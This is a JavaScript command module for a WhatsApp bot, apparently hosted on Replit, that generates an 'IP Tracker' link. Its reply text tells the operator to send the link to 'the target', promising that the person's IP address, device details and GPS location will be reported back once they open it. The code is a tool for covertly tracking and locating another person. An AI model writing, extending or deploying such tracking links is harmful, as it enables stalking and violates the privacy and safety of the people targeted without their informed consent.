const path = require('path');
const fs = require('fs');

module.exports = {
    name: 'geo',
    description: 'Create a link to get device and location info.',
    async execute(client, message, args) {
        try {
            // 1. Detect the Replit domain dynamically
            // Priority: New Replit App domain -> Dev Domain -> Fallback
            const slug = process.env.REPL_SLUG;
            const owner = process.env.REPL_OWNER;

            let domain = '';

            if (slug && owner) {
                domain = `https://${slug}.${owner}.replit.app`;
            } else if (process.env.REPLIT_DEV_DOMAIN) {
                domain = `https://${process.env.REPLIT_DEV_DOMAIN}`;
            }

            if (!domain) {
                return message.reply("❌ Error: Could not determine server URL. Please ensure the bot is running on Replit and the Webview is active.");
            }

            const trackerUrl = `${domain}/track`;
            const replyText = `📍 *IP Tracker Link Generated:*\n\n` +
                              `🔗 ${trackerUrl}\n\n` +
                              `*Instructions:*\n` +
                              `1. Send this link to the target.\n` +
                              `2. Once they open it, their info will be sent to your logs/chat.\n` +
                              `3. Results will include IP, Device Info, and GPS (if permitted).`;

            // 2. Fix for the 'remoteJid' error
            // message.from is the correct way to get the Chat ID in whatsapp-web.js
            await client.sendMessage(message.from, replyText);

        } catch (error) {
            console.error('Geo Command Error:', error);
            // message.reply is a shortcut for sending a message back to the same chat
            message.reply("❌ Error generating tracker link.");
        }
    }
};